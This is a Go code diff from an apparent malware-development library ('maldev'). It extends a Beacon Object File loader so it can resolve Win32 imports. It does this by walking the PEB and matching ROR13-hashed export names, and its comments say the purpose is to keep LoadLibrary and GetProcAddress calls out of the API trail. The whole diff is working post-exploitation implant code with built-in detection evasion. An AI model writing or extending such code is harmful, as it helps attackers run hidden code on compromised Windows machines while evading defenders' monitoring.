@@ -4,9 +4,13 @@ package bof
 
 import (
 	"encoding/binary"
+	"strings"
 	"sync"
 	"syscall"
 	"unsafe"
+
+	"github.com/oioio-space/maldev/hash"
+	"github.com/oioio-space/maldev/win/api"
 )
 
 // bofMu serialises BOF execution package-wide. The Beacon API stubs read
@@ -20,13 +24,56 @@ var (
 	beaconCBs     map[string]uintptr
 )
 
-// resolveBeaconImport returns the Go-side callback address for the given
-// COFF external symbol name, e.g. "__imp_BeaconPrintf". Returns ok=false
-// when the symbol is not part of the implemented Beacon API surface.
+// resolveBeaconImport returns the address that should be patched into the
+// BOF for the given COFF external symbol name. Three forms are recognised:
+//
+//   - "__imp_BeaconXxx"           — implemented Beacon API stub (Go callback).
+//   - "__imp_<DLL>$<Func>"        — Win32 dynamic-link import (e.g.
+//                                   "__imp_KERNEL32$LoadLibraryA"). Resolved
+//                                   via PEB walk + ROR13 export-table search
+//                                   so no GetProcAddress / LoadLibrary call
+//                                   shows up in the API trail.
+//   - anything else               — ok=false, caller fails the relocation
+//                                   with a clear "unresolved external symbol"
+//                                   error rather than silently NULL-patching.
 func resolveBeaconImport(name string) (uintptr, bool) {
 	beaconCBsOnce.Do(initBeaconCallbacks)
-	addr, ok := beaconCBs[name]
-	return addr, ok
+	if addr, ok := beaconCBs[name]; ok {
+		return addr, true
+	}
+	if dll, fn, ok := parseDollarImport(name); ok {
+		if addr, err := api.ResolveByHash(hash.ROR13Module(dll), hash.ROR13(fn)); err == nil {
+			return addr, true
+		}
+	}
+	return 0, false
+}
+
+// parseDollarImport splits a CS-format dynamic-link import symbol name into
+// (dllname, funcname). Accepted shapes:
+//
+//	__imp_KERNEL32$LoadLibraryA   → ("KERNEL32.DLL", "LoadLibraryA")
+//	__imp_USER32.DLL$MessageBoxW  → ("USER32.DLL", "MessageBoxW")
+//
+// The .DLL suffix is appended when missing — the PEB stores BaseDllName
+// uppercased with the extension, so ROR13Module("KERNEL32") would not
+// match the PEB walk's per-module hash.
+func parseDollarImport(name string) (dll, fn string, ok bool) {
+	const prefix = "__imp_"
+	if !strings.HasPrefix(name, prefix) {
+		return "", "", false
+	}
+	body := name[len(prefix):]
+	idx := strings.IndexByte(body, '$')
+	if idx <= 0 || idx == len(body)-1 {
+		return "", "", false
+	}
+	dll = strings.ToUpper(body[:idx])
+	fn = body[idx+1:]
+	if !strings.HasSuffix(dll, ".DLL") {
+		dll += ".DLL"
+	}
+	return dll, fn, true
 }
 
 func initBeaconCallbacks() {
